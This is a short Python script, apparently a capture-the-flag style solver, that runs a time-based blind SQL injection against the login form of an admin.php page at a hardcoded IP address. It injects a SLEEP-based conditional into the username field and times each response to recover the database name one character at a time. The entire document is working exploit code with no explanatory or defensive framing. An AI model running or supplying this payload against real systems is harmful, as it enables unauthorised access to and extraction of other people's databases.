import requests
import string
import time
url = "http://103.145.226.170:1000/admin.php"
brute = string.printable[10:-38]
hasil = ""

for i in range(1,13):
    for j in brute:
        isi = f"bla'OR IF(BINARY substring(database(),{i},1) = {j},sleep(5),0)-- "
        payload = {"username":isi,"password":"a"}
        awal = time.time()
        r = requests.post(url,data=payload)
        akhir = time.time()
        
        rentangWaktu = akhir - awal
        print(rentangWaktu)
        if rentangWaktu >= 3.0:
            hasil +=j
            print(hasil)
            break
        print(payload)
        